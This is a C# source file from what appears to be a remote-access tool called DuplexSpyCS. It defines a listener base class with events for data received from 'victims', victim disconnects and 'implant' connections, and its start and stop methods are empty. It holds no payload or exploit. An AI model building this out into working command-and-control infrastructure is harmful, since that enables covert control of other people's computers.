using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsListener
    {
        #region Information

        public string m_szName { set; get; }
        public int m_nPort { get; set; }
        public string m_szDescription { get; set; }

        #endregion
        #region Event

        /// <summary>
        /// Received bytes event handler.
        /// </summary>
        /// <param name="l">Listener class.</param>
        /// <param name="v">Victim class.</param>
        /// <param name="buffer">Received bytes buffer.</param>
        /// <param name="rec">Bytes size.</param>
        public delegate void ReceivedEventHandler(clsListener l, clsVictim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec);
        public event ReceivedEventHandler Received; //Received bytes event.

        /// <summary>
        /// Decoded bytes event handler.
        /// </summary>
        /// <param name="l">Listener class.</param>
        /// <param name="v">Victim class.</param>
        /// <param name="aMsg">Decoded bytes data.</param>
        public delegate void ReceivedDecodedEventHandler(clsListener l, clsVictim v, string[] aMsg);
        public event ReceivedDecodedEventHandler ReceivedDecoded; //Decoded bytes event.

        /// <summary>
        /// Victim disconnect event handler.
        /// </summary>
        /// <param name="v"></param>
        public delegate void DisconenctedEventHandler(clsVictim v);
        public event DisconenctedEventHandler Disconencted; //Disconnected event.

        public delegate void ImplantConnectedHandler(clsListener l, clsVictim v, string[] aszMsg);
        public event ImplantConnectedHandler ImplantConnected;

        #endregion

        public clsListener()
        {

        }

        public virtual void fnStart()
        {

        }

        public virtual void fnStop()
        {

        }

        public void fnReceived(clsListener listener, clsVictim victim, (int nCommand, int nParam, int nDataLength, byte[] abMsg) buffer, int nRecv)
        {
            Received?.Invoke(listener, victim, buffer, nRecv);
        }

        public void fnReceivedDecoded(clsListener listener, clsVictim victim, string[] aMsg)
        {
            ReceivedDecoded?.Invoke(listener, victim, aMsg);
        }

        public void fnDisconnected(clsVictim victim)
        {
            Disconencted?.Invoke(victim);
        }

        public void fnImplantConnected(clsListener listener, clsVictim victim, string[] aMsg)
        {
            ImplantConnected?.Invoke(listener, victim, aMsg);
        }
    }
}
